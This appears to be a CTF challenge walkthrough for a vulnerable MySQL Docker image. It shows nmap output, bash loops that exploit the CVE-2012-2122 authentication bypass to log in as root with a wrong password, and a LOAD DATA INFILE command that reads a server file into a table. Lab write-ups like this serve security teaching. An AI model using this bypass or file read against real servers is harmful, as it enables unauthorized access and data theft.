```
docker pull mahadev11/mysql11
docker run -i -t -d -p 3306:3306 mahadev11/mysql11
```














CTF instance Mysql challenge.

download docker
  
Add flag.txt using command echo cyberclubflag:{E8MIRVEt5kNFvCce1nBYPxXVsvEEl8xO} >flag.txt
  
How to exploit?
  
Nmap scan report for 172.16.137.98
Host is up (0.00018s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
110/tcp  open  pop3
143/tcp  open  imap
993/tcp  open  imaps
995/tcp  open  pop3s
3306/tcp open  mysql
8000/tcp open  http-alt
8080/tcp open  http-proxy
MAC Address: 06:15:BE:3F:A0:FC (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
root@ip-172-16-131-199:/home/ubuntu#


Get access as a mysql root user.

In short, if you try to authenticate to a MySQL server affected by this flaw, there is a chance it will accept your password even if the wrong one was supplied. The following one-liner in bash will provide access to an affected MySQL server as the root user account, without actually knowing the password.
 
```for i in `seq 1 1000`; do mysql -u root --password=bad -h 172.16.137.98 2>/dev/null; done```
  
  or
  
```for i in `seq 1 1000`; do mysql -uroot -pwrong -h 172.16.137.98 -P3306 ; done```
 
Mysql can load system files using below command. We will load a flag.txt file using mysql commands in to mysql datababse temp.
  
  Mysql commands:
  use databasename:
  show databases;
  show tables;
  create table table_name(column_name varchar(255));

  ```LOAD DATA INFILE '/etc/flag.txt' INTO TABLE mysql.user;```
  
  //good read :https://securityweekly.com/2013/01/18/mysql-file-system-enumeration/
  //http://www.freebuf.com/vuls/3815.html
https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/
  

